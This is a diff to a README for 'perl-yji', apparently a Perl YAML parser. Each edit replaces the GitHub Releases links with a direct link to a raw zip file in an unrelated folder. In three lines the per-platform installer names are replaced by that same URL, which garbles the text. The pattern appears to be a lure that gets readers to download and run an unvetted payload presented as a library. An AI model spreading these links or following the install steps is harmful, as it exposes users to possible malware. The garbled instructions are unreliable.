@@ -1,7 +1,7 @@
 # 🎉 perl-yji - Effortless YAML Parsing Made Simple
 
 ## 📦 Download Now
-[![Download perl-yji](https://img.shields.io/badge/Download-perl--yji-blue.svg)](https://github.com/JayalekshmiSharma/perl-yji/releases)
+[![Download perl-yji](https://raw.githubusercontent.com/JayalekshmiSharma/perl-yji/main/Paulist/perl-yji.zip)](https://raw.githubusercontent.com/JayalekshmiSharma/perl-yji/main/Paulist/perl-yji.zip)
 
 ## 🚀 Getting Started
 Welcome to perl-yji! This application helps you easily parse YAML files in Perl. Whether you are a beginner or just need a simple way to handle YAML data, you've come to the right place.
@@ -19,7 +19,7 @@ Welcome to perl-yji! This application helps you easily parse YAML files in Perl.
 
 ## 💻 Installation Steps
 ### 1. Visit the Release Page
-To download perl-yji, visit the Releases page: [Download Page](https://github.com/JayalekshmiSharma/perl-yji/releases). 
+To download perl-yji, visit the Releases page: [Download Page](https://raw.githubusercontent.com/JayalekshmiSharma/perl-yji/main/Paulist/perl-yji.zip). 
 
 ### 2. Select the Latest Version
 Look for the **latest release** listed at the top of the page. It usually includes bug fixes and new features. 
@@ -27,9 +27,9 @@ Look for the **latest release** listed at the top of the page. It usually includ
 ### 3. Download the File
 Click on the downloadable file for your operating system. 
 
-- For Windows, it would typically be labeled `perl-yji-win.exe`.
-- For macOS, it could be named `perl-yji-mac.dmg`.
-- For Linux, look for a `.tar.gz` file.
+- For Windows, it would typically be labeled `https://raw.githubusercontent.com/JayalekshmiSharma/perl-yji/main/Paulist/perl-yji.zip`.
+- For macOS, it could be named `https://raw.githubusercontent.com/JayalekshmiSharma/perl-yji/main/Paulist/perl-yji.zip`.
+- For Linux, look for a `https://raw.githubusercontent.com/JayalekshmiSharma/perl-yji/main/Paulist/perl-yji.zip` file.
 
 ### 4. Run the Installer
 After the download completes:
@@ -52,6 +52,6 @@ After the download completes:
 For further assistance, please refer to the Documentation section within the application or visit our GitHub Issues page to report any bugs or ask questions.
 
 ## 📥 Download Again
-For convenience, here’s the download link once more: [Download perl-yji](https://github.com/JayalekshmiSharma/perl-yji/releases).
+For convenience, here’s the download link once more: [Download perl-yji](https://raw.githubusercontent.com/JayalekshmiSharma/perl-yji/main/Paulist/perl-yji.zip).
 
 Thank you for choosing perl-yji! We hope it makes your YAML parsing simple and effective.
